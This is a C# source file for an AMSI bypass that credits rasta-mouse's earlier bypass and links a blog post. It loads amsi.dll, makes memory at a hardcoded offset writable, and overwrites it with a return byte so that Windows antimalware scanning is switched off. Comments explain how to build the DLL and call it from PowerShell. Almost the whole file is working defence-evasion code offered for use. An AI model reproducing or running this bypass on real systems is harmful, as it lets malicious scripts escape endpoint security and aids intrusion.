/*
   
   Notes:
 
   Big thanks to _rastamouse for his original bypass here: https://github.com/rasta-mouse/AmsiScanBufferBypass
   To see more, check out my post relating to this: https://crawl3r.github.io/2020-05-22/AMSI_Resurrecting_the_dead

*/

// Usage:
// Build into a DLL, deploy and run:
// PS>  [System.Reflection.Assembly]::LoadFile("C:\\Users\\usr_gary\\Desktop\\AmsiFun.dll")
// PS>  [Amsi]::Bypass()


using System;
using System.Runtime.InteropServices;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            IntPtr lib = Win32.LoadLibrary("amsi.dll");
            int offset = 0x2540;
            IntPtr addr = lib + offset;

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}